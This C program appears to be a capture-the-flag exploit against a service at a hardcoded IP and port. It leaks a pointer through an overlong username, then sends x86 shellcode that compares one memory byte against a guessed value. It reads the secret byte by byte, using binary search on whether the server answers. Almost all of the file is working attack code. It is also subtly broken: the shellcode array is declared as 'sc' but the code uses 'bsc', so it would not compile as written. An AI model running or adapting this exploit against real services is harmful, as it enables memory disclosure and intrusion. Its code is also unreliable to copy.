#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

/* kinda gross, don't care */
int readline(int fd, char *target, char delim, int length) {
    int x = 0;
    char c;

    while (x < length && read(fd, &c, 1) == 1) {
        if (c == delim) {
            *target = 0;
            return x;
        } else
            *target++ = c;
        x++;
    }
    while (read(fd, &c, 1) == 1 && c != '\n');
    return x;
}

int open_socket(char *ip, int port) {
    struct sockaddr_in sai;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sai.sin_addr.s_addr = inet_addr(ip);
    sai.sin_family = AF_INET;
    sai.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&sai, sizeof(sai));
    return sock;
}

int main(int argc, char **argv) {
    int i, x, sock, last_success, offset = 0;
    u_char byte;
    u_char buffer[1024], output[100], *out = output, *ptr;
    u_char username[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";

    // AAAAAAAA = target address to search, BB = test value
    u_char sc[] = "\xA0\xAA\xAA\xAA\xAA\x3c\xBB\x73\x02\xcd" \
                  "\x03\x31\xc0\x89\xc3\x83\xc8\x01\xcd\x80";

    do {
        byte = 128;
        for (i = 6; i>=-1; i--) {
            sock = open_socket("108.61.195.19", 49782);

            /* eat the ascii art */
            for (x = 0; x < 16; x++)
                readline(sock, buffer, '\n', sizeof(buffer));

            write(sock, username, strlen(username));

            /* accepted */
            readline(sock, buffer, '\n', sizeof(buffer));

            /* null bytes can mean you don't leak the entire pointer, just try
               that step again. */
            if (strlen(buffer) != 45) {
                printf("Unlucky alignment, retrying.\n");
                i++;
                continue;
            }

            /* load program */
            readline(sock, buffer, '\n', sizeof(buffer));

            memcpy(&ptr, buffer+41, sizeof(ptr));
            ptr += offset;
            memcpy(bsc+1, &ptr, 4);
            bsc[6] = byte;

            /* shellcode length */
            x = 20;
            write(sock, &x, sizeof(x));
 
            /* shellcode */
            write(sock, bsc, 20);

            /* try the next step up or down, depending on whether there was a
               response or not */
            if (!readline(sock, buffer, '\n', sizeof(buffer)))
                byte -= 1<<i;
            else {
                last_success = byte;
                byte += 1<<i;
            }
        }
        if (byte > 1) { *out++ = last_success; }
        offset++;
    } while (byte != 1);
    *out++ = 0;
    printf("%s\n", output);
}

